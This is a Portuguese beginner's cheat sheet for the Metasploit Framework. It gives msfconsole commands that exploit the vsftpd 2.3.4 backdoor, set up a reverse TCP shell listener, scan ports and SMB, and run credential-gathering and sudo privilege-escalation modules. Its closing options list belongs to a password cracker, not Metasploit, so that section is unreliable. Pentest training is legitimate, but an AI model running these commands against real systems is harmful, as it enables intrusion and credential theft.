# 🛠 Metasploit – The Basics

O **Metasploit Framework** é uma ferramenta de pentesting amplamente usada para **desenvolver, testar e executar exploits** contra sistemas e aplicações vulneráveis. Ele oferece módulos de exploração, payloads, scanners e pós-exploração, permitindo realizar testes de segurança de forma controlada e ética.

## Conceitos Principais
- **Exploit:** módulo que tira vantagem de uma vulnerabilidade específica.  
- **Payload:** código executado no sistema alvo após a exploração (ex.: shell reverso, Meterpreter).  
- **Auxiliary Modules:** módulos para varredura, fuzzing ou coleta de informações, sem exploração direta.  
- **Post-Exploitation:** módulos que permitem coletar informações adicionais, escalar privilégios ou manter acesso após exploração.  
- **Listener / Handler:** serviço que aguarda a conexão do payload de retorno.

## Inicializando o Metasploit
```bash
# Iniciar console do Metasploit
msfconsole

# Verificar versão
msfconsole --version

# Listar módulos disponíveis
msf > show exploits
msf > show auxiliary
msf > show payloads
msf > show post
```

## Configuração Básica de Exploit
```bash
# Selecionar exploit
msf > use exploit/unix/ftp/vsftpd_234_backdoor

# Definir alvo
msf > set RHOSTS 192.168.1.10
msf > set RPORT 21

# Definir payload
msf > set PAYLOAD cmd/unix/interact

# Executar exploit
msf > run
```
## Listener / Handler
```bash
msf > use exploit/multi/handler
msf > set PAYLOAD linux/x86/shell_reverse_tcp
msf > set LHOST 192.168.1.5
msf > set LPORT 4444
msf > run
```
## Auxiliares e Scanners
```bash
# Escanear portas TCP
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 192.168.1.0/24
msf > run

# Coleta de informações SMB
msf > use auxiliary/scanner/smb/smb_version
msf > set RHOSTS 192.168.1.20
msf > run
```
## Pós-Exploitation
```bash
# Coleta de credenciais
msf > use post/windows/gather/credentials/windows_autologin
msf > set SESSION 1
msf > run

# Escalada de privilégios Linux
msf > use post/linux/escalate/sudo
msf > set SESSION 2
msf > run
```
## Opções Importantes
- **wordlist=<arquivo>** → define a lista de palavras para ataque de dicionário (quando aplicável).
- **rules** → aplica regras de mutação à wordlist (quando aplicável).
- **incremental** → modo de ataque por força bruta otimizado (quando aplicável).
- **format=<tipo>** → especifica o tipo de hash (quando aplicável).
- **show** → mostra senhas quebradas de um arquivo de hashes (quando aplicável).
